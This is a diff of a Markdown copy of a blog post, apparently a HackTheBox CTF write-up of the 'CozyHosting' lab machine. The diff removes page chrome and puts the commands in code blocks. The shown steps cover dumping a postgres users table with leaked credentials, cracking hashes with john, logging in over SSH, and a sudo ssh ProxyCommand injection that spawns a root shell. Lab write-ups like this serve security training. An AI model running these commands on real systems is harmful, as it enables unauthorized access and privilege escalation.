@@ -1,28 +1,16 @@
 HackTheBox write up: “CozyHosting” Machine
 ==========================================
 
-[![zerosandones](https://miro.medium.com/v2/resize:fill:88:88/1*8PgWCWtteykN7zPXDqImEQ.jpeg)
 
 ](https://medium.com/@ahmedgomaa_45441?source=post_page-----8b55beb59ace--------------------------------)
 
 [zerosandones](https://medium.com/@ahmedgomaa_45441?source=post_page-----8b55beb59ace--------------------------------)
 
-·
-
-[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fa3f1b2b68ccf&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ahmedgomaa_45441%2Fhackthebox-write-up-cozyhosting-machine-8b55beb59ace&user=zerosandones&userId=a3f1b2b68ccf&source=post_page-a3f1b2b68ccf----8b55beb59ace---------------------post_header-----------)
-
-5 min read·Just now
-
-\--
-
-Listen
-
-Share
 
 ![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/879cc2ee-bedc-448e-8f5a-1fdc65ee1e8c)
 
 
-Welcome To HACKTHEBOX:CozyHosting machine writeup. It is an easy machine with a focus on web application vulnerabilities and privilage escalation vulnerabilities.
+**Welcome To HACKTHEBOX:CozyHosting machine writeup. It is an easy machine with a focus on web application vulnerabilities and privilage escalation vulnerabilities.**
 
 we first start by running a basic nmap scan against the machine ip
 
@@ -108,34 +96,39 @@ we can start inspecting this file using tool like jd-gui
 
 
 after inspecting we can find that it contains postgres database credentials like the username and the password, so we try to login in to the postgres database using the commnads
-
+```
 psql -h 127.0.0.1 -U postgres
+```
+```
 
 \\c cozyhosting
+```
+```
 
 \\d #to list availabe databases
+```
 
 ![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/c7d07dc7-f747-413d-b30a-b5511df006b4)
 
-
-
+```
 select \* from users; #To select all data in the users database
+```
 
 
 ![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/2032451d-df9e-4898-8a5a-75523888c34c)
 
 the passwords is hashed, we can try to crack it using john the ripper, with the following command, pointing to the wordlist to use ( in this case rockyou.txt will be sufficient )
 
-
+```
 john hash.txt --wordlist=/home/zeronull/rockyou.txt
-
+```
 ![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/d0966515-7398-4b64-a993-8df4d8349f9b)
 
 now we can try to use this password to ssh into the machine using the user josh
 
-
+```
 ssh josh@10.10.11.230 
-
+```
 
 And we succesfully log in with the user josh, and we can access his directory, and access the user flag.txt
 
@@ -159,9 +152,9 @@ we find:
 
 and by running
 
-
+```
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-
+```
 
 we get our root access successfully.
 
